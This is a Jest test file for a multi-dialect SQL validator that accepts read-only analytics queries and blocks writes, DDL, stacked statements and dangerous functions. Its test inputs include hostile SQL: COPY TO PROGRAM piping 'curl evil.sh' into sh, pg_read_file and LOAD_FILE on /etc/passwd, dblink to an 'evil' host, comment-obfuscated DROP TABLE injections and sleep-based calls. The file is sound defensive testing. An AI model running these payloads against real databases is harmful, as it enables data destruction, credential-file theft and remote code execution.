import { DatabaseType, SqlRiskLevel, SqlStatementKind } from '@sqlpilot/shared';
import { validateSql, ValidateOptions } from './validator';

const PG = DatabaseType.POSTGRES;
const MY = DatabaseType.MYSQL;
const LITE = DatabaseType.SQLITE;

const ro = (databaseType: DatabaseType): ValidateOptions => ({ databaseType, allowWrite: false });
const codes = (sql: string, db: DatabaseType = PG, allowWrite = false) =>
  validateSql(sql, { databaseType: db, allowWrite }).violations.map((v) => v.code);

describe('validateSql: safe reads', () => {
  it('accepts a simple SELECT and does NOT rewrite it (no LIMIT injection)', () => {
    const r = validateSql('SELECT id, name FROM customers', ro(PG));
    expect(r.valid).toBe(true);
    expect(r.statementKind).toBe(SqlStatementKind.READ);
    expect(r.isReadOnly).toBe(true);
    expect(r.hasLimit).toBe(false);
    expect(r.normalizedSql).toBe('SELECT id, name FROM customers');
    expect(r.risk).toBe(SqlRiskLevel.LOW);
  });

  it('reports a literal top-level LIMIT', () => {
    const r = validateSql('SELECT * FROM orders LIMIT 5', ro(PG));
    expect(r.valid).toBe(true);
    expect(r.topLevelLimit).toBe(5);
    expect(r.hasLimit).toBe(true);
    expect(r.risk).toBe(SqlRiskLevel.SAFE);
  });

  it.each([
    [PG, 'SELECT * FROM t LIMIT 10 OFFSET 20', 10],
    [MY, 'SELECT * FROM t LIMIT 20, 10', 10],
    [LITE, 'SELECT * FROM t LIMIT 7', 7],
    [PG, 'SELECT * FROM t LIMIT 999999999999', 999999999999],
  ])('reads the LIMIT of %s: %s', (db, sql, expected) => {
    expect(validateSql(sql, ro(db as DatabaseType)).topLevelLimit).toBe(expected);
  });

  it('ignores a LIMIT that only exists in a subquery', () => {
    const r = validateSql('SELECT * FROM (SELECT * FROM t LIMIT 5) x', ro(PG));
    expect(r.valid).toBe(true);
    expect(r.topLevelLimit).toBeNull();
  });

  it('accepts CTEs and does not list them as tables', () => {
    const r = validateSql('WITH t AS (SELECT id FROM customers) SELECT id FROM t', ro(PG));
    expect(r.valid).toBe(true);
    expect(r.referencedTables).toEqual(['customers']);
  });

  it('extracts tables and alias-resolved columns', () => {
    const r = validateSql('SELECT c.name FROM customers c JOIN orders o ON o.customer_id = c.id', ro(PG));
    expect(r.referencedTables.sort()).toEqual(['customers', 'orders']);
    expect(r.referencedColumns).toEqual(expect.arrayContaining(['customers.name', 'orders.customer_id', 'customers.id']));
  });

  it('accepts a trailing semicolon and normalises it away', () => {
    const r = validateSql('SELECT 1;', ro(PG));
    expect(r.valid).toBe(true);
    expect(r.normalizedSql).toBe('SELECT 1');
  });

  it('is not fooled by dangerous words inside string literals or identifiers', () => {
    expect(validateSql("SELECT 'DROP TABLE users; pg_sleep(9)' AS note FROM customers", ro(PG)).valid).toBe(true);
    expect(validateSql('SELECT "delete", "into" FROM t', ro(PG)).valid).toBe(true);
    expect(validateSql('SELECT `update` FROM t', ro(MY)).valid).toBe(true);
    expect(validateSql("SELECT * FROM t WHERE note = 'x -- y; DROP TABLE t'", ro(PG)).valid).toBe(true);
  });

  it('allows ORDER BY ... DESC (not confused with a DESCRIBE statement)', () => {
    expect(validateSql('SELECT * FROM t ORDER BY a DESC, b ASC', ro(PG)).valid).toBe(true);
  });

  const realistic: Array<[DatabaseType, string]> = [
    [PG, "SELECT date_trunc('month', created_at) AS m, sum(total)::numeric FROM orders GROUP BY 1 ORDER BY 1"],
    [PG, "SELECT * FROM orders WHERE created_at >= now() - interval '30 days'"],
    [PG, 'SELECT name, ROW_NUMBER() OVER (PARTITION BY city ORDER BY total DESC) FROM t'],
    [PG, 'SELECT count(*) FILTER (WHERE x > 1) FROM t'],
    [PG, "SELECT * FROM t WHERE name ILIKE '%a%' AND data->>'k' = 'v'"],
    [PG, 'SELECT * FROM a LEFT JOIN LATERAL (SELECT * FROM b WHERE b.a = a.id LIMIT 1) x ON true'],
    [MY, "SELECT DATE_FORMAT(created_at, '%Y-%m') m, SUM(total) FROM orders GROUP BY m"],
    [MY, 'SELECT * FROM t WHERE created_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)'],
    [LITE, "SELECT strftime('%Y-%m', created_at) AS m, SUM(total) FROM orders GROUP BY m"],
    [LITE, "SELECT * FROM t WHERE created_at >= date('now','-1 month','start of month')"],
    [LITE, 'WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<10) SELECT * FROM c'],
    [LITE, 'SELECT COUNT(DISTINCT customer_id) FROM orders'],
    [PG, 'SELECT 1 UNION SELECT 2'],
  ];
  it.each(realistic)('accepts realistic analytics SQL [%s] %s', (db, sql) => {
    const r = validateSql(sql, ro(db));
    expect(r.violations).toEqual([]);
    expect(r.valid).toBe(true);
  });
});

describe('validateSql: statements that must be rejected (all dialects)', () => {
  const dialects: DatabaseType[] = [PG, MY, LITE];
  const destructive: Array<[string, string]> = [
    ['DROP TABLE users', 'DDL_BLOCKED'],
    ['DELETE FROM users', 'WRITE_DISABLED'],
    ['UPDATE users SET a = 1', 'WRITE_DISABLED'],
    ["INSERT INTO users (a) VALUES (1)", 'WRITE_DISABLED'],
    ['ALTER TABLE users ADD COLUMN x int', 'DDL_BLOCKED'],
    ['TRUNCATE TABLE users', 'DDL_BLOCKED'],
    ['CREATE TABLE t (id int)', 'DDL_BLOCKED'],
    ['GRANT ALL ON users TO bob', 'DCL_BLOCKED'],
    ['REVOKE SELECT ON users FROM bob', 'DCL_BLOCKED'],
  ];
  describe.each(dialects)('dialect %s', (db) => {
    it.each(destructive)('blocks %s', (sql, code) => {
      const r = validateSql(sql, ro(db));
      expect(r.valid).toBe(false);
      expect(r.isReadOnly).toBe(false);
      // a parse failure is also an acceptable way to fail closed for exotic per-dialect syntax
      expect(r.violations.map((v) => v.code).some((c) => c === code || c === 'PARSE_FAILED')).toBe(true);
    });
  });
});

describe('validateSql: SELECT INTO / locking / file output', () => {
  it.each([
    [PG, 'SELECT * INTO newtab FROM users'],
    [PG, 'SELECT * INTO TEMP newtab FROM users'],
    [MY, "SELECT * FROM users INTO OUTFILE '/tmp/x'"],
    [MY, "SELECT * FROM users INTO DUMPFILE '/tmp/x'"],
    [MY, 'SELECT id INTO @v FROM users'],
    [PG, 'WITH x AS (SELECT * FROM users) SELECT * INTO copy_of_users FROM x'],
  ])('rejects INTO [%s] %s', (db, sql) => {
    const r = validateSql(sql, ro(db as DatabaseType));
    expect(r.valid).toBe(false);
  });

  it.each([
    [PG, 'SELECT * FROM users FOR UPDATE'],
    [PG, 'SELECT * FROM users FOR SHARE'],
    [PG, 'SELECT * FROM users FOR NO KEY UPDATE'],
    [MY, 'SELECT * FROM users FOR UPDATE'],
    [MY, 'SELECT * FROM users LOCK IN SHARE MODE'],
    [MY, 'SELECT * FROM users FOR SHARE'],
  ])('rejects locking read [%s] %s', (db, sql) => {
    expect(validateSql(sql, ro(db as DatabaseType)).valid).toBe(false);
  });

  it('labels INTO and FOR UPDATE with specific violation codes when it can parse them', () => {
    expect(codes('SELECT * INTO newtab FROM users')).toEqual(expect.arrayContaining(['SELECT_INTO']));
    expect(codes('SELECT * FROM users FOR UPDATE', MY)).toEqual(expect.arrayContaining(['LOCKING_READ']));
  });
});

describe('validateSql: nested and hidden statements', () => {
  it.each([
    [PG, 'WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d'],
    [PG, 'WITH i AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM i'],
    [PG, 'WITH u AS (UPDATE t SET a = 1 RETURNING *) SELECT * FROM u'],
    [PG, 'WITH x AS (SELECT 1) DELETE FROM users'],
    [MY, 'WITH x AS (SELECT 1) DELETE FROM users'],
    [PG, 'EXPLAIN ANALYZE DELETE FROM users'],
    [PG, "COPY (SELECT 1) TO PROGRAM 'id'"],
    [PG, "COPY users TO PROGRAM 'curl evil.sh | sh'"],
    [PG, "COPY users FROM PROGRAM 'id'"],
    [PG, "COPY users TO '/tmp/x'"],
    [PG, 'DO $$ BEGIN EXECUTE \'DROP TABLE users\'; END $$'],
    [PG, "SELECT 1; DROP TABLE users"],
    [MY, "SELECT 1; DROP TABLE users"],
    [LITE, "SELECT 1; DROP TABLE users"],
    [PG, 'CALL do_something()'],
    [MY, 'CALL do_something()'],
    [PG, "EXECUTE 'DROP TABLE users'"],
    [PG, "SET ROLE postgres"],
    [PG, 'BEGIN'],
    [PG, 'COMMIT'],
    [LITE, 'PRAGMA writable_schema = 1'],
    [LITE, "ATTACH DATABASE '/etc/passwd' AS x"],
    [MY, 'SHOW TABLES'],
    [MY, 'USE mysql'],
    [PG, 'VACUUM'],
  ])('rejects [%s] %s', (db, sql) => {
    expect(validateSql(sql, ro(db as DatabaseType)).valid).toBe(false);
  });

  it('marks stacked statements and reports them as CRITICAL', () => {
    const r = validateSql('SELECT 1; DROP TABLE users', ro(PG));
    expect(r.stackedStatements).toBe(true);
    expect(r.violations.map((v) => v.code)).toContain('STACKED_STATEMENTS');
    expect(r.risk).toBe(SqlRiskLevel.CRITICAL);
  });

  it('detects nested DML in a data-modifying CTE where the parser understands it', () => {
    const r = validateSql('WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d', ro(PG));
    expect(r.valid).toBe(false);
  });
});

describe('validateSql: comment-obfuscated SQL', () => {
  it.each([
    [PG, 'SELECT 1 -- \n; DELETE FROM users'],
    [PG, 'SELECT 1 /* x */ ; /* y */ DROP TABLE users'],
    [PG, 'SELECT 1; -- hi\nDROP TABLE users'],
    [PG, 'DEL/**/ETE FROM users'],
    [PG, 'SELECT/**/*/**/INTO/**/newtab/**/FROM/**/users'],
    [MY, 'SELECT 1 # comment\n; DROP TABLE users'],
    [MY, 'SELECT 1 /* a */ /* b */ ; DROP TABLE users'],
    [MY, 'SELECT 1 /* not nested /* */ ; DROP TABLE users */'],
    [MY, 'SELECT 1 -- x\n; DROP TABLE users'],
    [LITE, 'SELECT 1 -- x\n; DROP TABLE users'],
    [PG, "SELECT /* pg_sleep */ pg_sleep(10)"],
    [PG, 'SELECT pg_sleep/* hide */(10)'],
  ])('rejects [%s] %s', (db, sql) => {
    expect(validateSql(sql, ro(db as DatabaseType)).valid).toBe(false);
  });

  it('applies the engine\'s own comment rules: `#` is a comment in MySQL but an operator in PostgreSQL', () => {
    // MySQL: everything after `#` is a comment, so this is one harmless statement.
    const my = validateSql('SELECT 1 # ; DROP TABLE users', ro(MY));
    expect(my.valid).toBe(true);
    expect(my.normalizedSql).toBe('SELECT 1');
    // PostgreSQL: `#` is an operator; the `;` is real, so this is two statements.
    expect(validateSql('SELECT 1 # 2; DROP TABLE users', ro(PG)).valid).toBe(false);
  });

  it('nesting differs per engine: PostgreSQL nests block comments, MySQL does not', () => {
    const sql = 'SELECT 1 /* /* nested */ ; DROP TABLE users */';
    // PostgreSQL: the whole tail is ONE comment, so this is a single harmless statement.
    const pg = validateSql(sql, ro(PG));
    expect(pg.valid).toBe(true);
    expect(pg.normalizedSql).toBe('SELECT 1');
    // MySQL: the comment ends at the first `*/`, exposing `; DROP TABLE users */`.
    expect(validateSql(sql, ro(MY)).valid).toBe(false);
  });

  it('MySQL version comments (`/*!...*/`) are stripped, so their hidden body is neither validated NOR executed', () => {
    for (const hidden of ['/*!50000 ; DROP TABLE users */', '/*!40001 FOR UPDATE */', "/*!50000 INTO OUTFILE '/tmp/x' */"]) {
      const r = validateSql(`SELECT * FROM users ${hidden}`, ro(MY));
      expect(r.normalizedSql).toBe('SELECT * FROM users');
      expect(r.normalizedSql).not.toMatch(/DROP|UPDATE|OUTFILE/i);
    }
  });

  it('MySQL `--` needs a following space, so `--x` is not a comment', () => {
    const r = validateSql('SELECT 1--1; DROP TABLE users', ro(MY));
    expect(r.valid).toBe(false);
  });

  it('what is validated is exactly what is executed: comments are removed from normalizedSql', () => {
    const r = validateSql('SELECT /* hi */ id -- trailing\nFROM t', ro(PG));
    expect(r.valid).toBe(true);
    expect(r.normalizedSql).not.toMatch(/hi|trailing|--|\/\*/);
  });

  it('rejects unterminated strings, identifiers, and comments', () => {
    for (const sql of ["SELECT 'abc", 'SELECT "abc', 'SELECT 1 /* never closed', "SELECT $$ oops"]) {
      expect(validateSql(sql, ro(PG)).valid).toBe(false);
    }
  });

  it('handles PostgreSQL dollar-quotes and E-strings without leaking `;` out of literals', () => {
    expect(validateSql("SELECT $$a; DROP TABLE users;$$ AS s", ro(PG)).valid).toBe(true);
    expect(validateSql("SELECT $tag$a; b$tag$ AS s", ro(PG)).valid).toBe(true);
    // node-sql-parser cannot parse E'..' strings, so these fail closed (the lexer still keeps it ONE statement).
    const e = validateSql("SELECT E'it\\'s; fine' AS s", ro(PG));
    expect(e.stackedStatements).toBe(false);
    expect(e.valid).toBe(false);
    // a backslash-escaped quote in MySQL keeps the literal open, so the `;` is inside it
    expect(validateSql("SELECT 'a\\'; DROP TABLE users; --' AS s", ro(MY)).valid).toBe(true);
    // ...but in PostgreSQL (standard strings) the same text ends the literal early: a real second statement.
    expect(validateSql("SELECT 'a\\'; DROP TABLE users; --'", ro(PG)).valid).toBe(false);
  });
});

describe('validateSql: dangerous functions', () => {
  const pgFns = [
    "pg_read_file('/etc/passwd')",
    "pg_read_binary_file('/etc/passwd')",
    "pg_catalog.pg_read_file('/etc/passwd')",
    "PG_READ_FILE('/etc/passwd')",
    "lo_import('/etc/passwd')",
    "lo_export(1, '/tmp/x')",
    "dblink_exec('host=evil', 'DROP TABLE t')",
    "dblink('host=evil', 'select 1')",
    'pg_terminate_backend(123)',
    'pg_cancel_backend(123)',
    'pg_sleep(10)',
    'pg_sleep_for(\'1 minute\')',
    "nextval('seq')",
    "setval('seq', 1)",
    "set_config('role', 'postgres', false)",
    'pg_advisory_lock(1)',
    "pg_ls_dir('/')",
    "query_to_xml('select * from users', true, true, '')",
    "pg_stat_file('/etc/passwd')",
  ];
  it.each(pgFns)('rejects PostgreSQL SELECT %s', (fn) => {
    const r = validateSql(`SELECT ${fn}`, ro(PG));
    expect(r.valid).toBe(false);
  });

  it('rejects dangerous functions used in FROM, WHERE, subqueries, and CTEs', () => {
    for (const sql of [
      "SELECT * FROM pg_ls_dir('/')",
      "SELECT * FROM users WHERE id = (SELECT length(pg_read_file('/etc/passwd')))",
      "WITH x AS (SELECT pg_read_file('/etc/passwd') AS c) SELECT * FROM x",
      'SELECT * FROM users ORDER BY pg_sleep(1)',
      "SELECT * FROM users WHERE name = 'x' AND pg_sleep(1) IS NULL",
      "SELECT CASE WHEN true THEN pg_sleep(1)::text END",
    ]) {
      expect(validateSql(sql, ro(PG)).valid).toBe(false);
    }
  });

  const myFns = ["LOAD_FILE('/etc/passwd')", 'SLEEP(10)', "BENCHMARK(1000000, MD5('a'))", "GET_LOCK('x', 10)", "RELEASE_LOCK('x')"];
  it.each(myFns)('rejects MySQL SELECT %s', (fn) => {
    expect(validateSql(`SELECT ${fn}`, ro(MY)).valid).toBe(false);
  });

  it.each(["load_extension('x.so')", "readfile('/etc/passwd')", "writefile('/tmp/x', 'y')", 'zeroblob(1000000000)', 'randomblob(1000000000)'])(
    'rejects SQLite SELECT %s',
    (fn) => {
      expect(validateSql(`SELECT ${fn}`, ro(LITE)).valid).toBe(false);
    },
  );

  it('reports the function by name and lists every function used', () => {
    const r = validateSql("SELECT count(*), pg_sleep(1) FROM users", ro(PG));
    expect(r.violations).toEqual(expect.arrayContaining([expect.objectContaining({ code: 'DANGEROUS_FUNCTION', keyword: 'pg_sleep' })]));
    expect(r.functionsUsed).toEqual(expect.arrayContaining(['count', 'pg_sleep']));
  });

  it('does not block harmless functions that merely resemble dangerous ones', () => {
    for (const sql of ['SELECT lower(name), coalesce(a, 0), length(b) FROM t', "SELECT date_trunc('day', ts) FROM t", 'SELECT abs(x), round(y, 2) FROM t']) {
      expect(validateSql(sql, ro(PG)).valid).toBe(true);
    }
  });
});

describe('validateSql: huge and nested LIMIT', () => {
  it('never rewrites the query for a huge LIMIT (the driver caps the fetch instead)', () => {
    const r = validateSql('SELECT * FROM t LIMIT 99999999', ro(PG));
    expect(r.valid).toBe(true);
    expect(r.normalizedSql).toBe('SELECT * FROM t LIMIT 99999999');
    expect(r.topLevelLimit).toBe(99999999);
  });

  it('a LIMIT hidden in a CTE or subquery is not the top-level LIMIT', () => {
    expect(validateSql('WITH x AS (SELECT * FROM t LIMIT 1) SELECT * FROM x', ro(PG)).topLevelLimit).toBeNull();
    expect(validateSql('SELECT * FROM t WHERE id IN (SELECT id FROM u LIMIT 3)', ro(PG)).topLevelLimit).toBeNull();
  });

  it('a top-level LIMIT after a subquery LIMIT is still found', () => {
    expect(validateSql('SELECT * FROM (SELECT * FROM t LIMIT 5) x LIMIT 100', ro(PG)).topLevelLimit).toBe(100);
  });

  it('a non-literal LIMIT is reported as unknown', () => {
    expect(validateSql('SELECT * FROM t LIMIT ALL', ro(PG)).topLevelLimit).toBeNull();
  });
});

describe('validateSql: write mode (manual SQL editor only)', () => {
  it('permits a single DELETE when writes are explicitly allowed', () => {
    const r = validateSql('DELETE FROM t WHERE a = 1', { databaseType: PG, allowWrite: true });
    expect(r.valid).toBe(true);
    expect(r.statementKind).toBe(SqlStatementKind.WRITE);
    expect(r.isReadOnly).toBe(false);
  });

  it.each([
    'INSERT INTO t (a) VALUES (1)',
    'UPDATE t SET a = 1 WHERE b = 2',
    'DELETE FROM t WHERE a IN (SELECT id FROM u)',
  ])('permits %s in write mode', (sql) => {
    expect(validateSql(sql, { databaseType: PG, allowWrite: true }).valid).toBe(true);
  });

  it.each([
    'DROP TABLE t',
    'TRUNCATE t',
    'ALTER TABLE t ADD COLUMN x int',
    'CREATE TABLE x (a int)',
    'GRANT ALL ON t TO bob',
    'DELETE FROM t; DROP TABLE t',
    "DELETE FROM t WHERE id = pg_read_file('/x')::int",
    'WITH d AS (DELETE FROM t RETURNING *) DELETE FROM u',
  ])('still blocks %s even in write mode', (sql) => {
    expect(validateSql(sql, { databaseType: PG, allowWrite: true }).valid).toBe(false);
  });
});

describe('validateSql: misc fail-closed behaviour', () => {
  it('rejects empty and whitespace-only input', () => {
    expect(validateSql('   ', ro(PG)).valid).toBe(false);
    expect(validateSql('', ro(PG)).valid).toBe(false);
    expect(validateSql(';', ro(PG)).valid).toBe(false);
    expect(validateSql('-- just a comment', ro(PG)).valid).toBe(false);
  });

  it('rejects anything it cannot parse instead of guessing it is a read', () => {
    const r = validateSql('SELEKT * FROM users', ro(PG));
    expect(r.valid).toBe(false);
    expect(r.violations.map((v) => v.code)).toContain('PARSE_FAILED');
  });

  it('survives absurdly nested input without throwing', () => {
    const deep = 'SELECT ' + '('.repeat(3000) + '1' + ')'.repeat(3000);
    expect(() => validateSql(deep, ro(PG))).not.toThrow();
    expect(validateSql(deep, ro(PG)).valid).toBeDefined();
  });
});
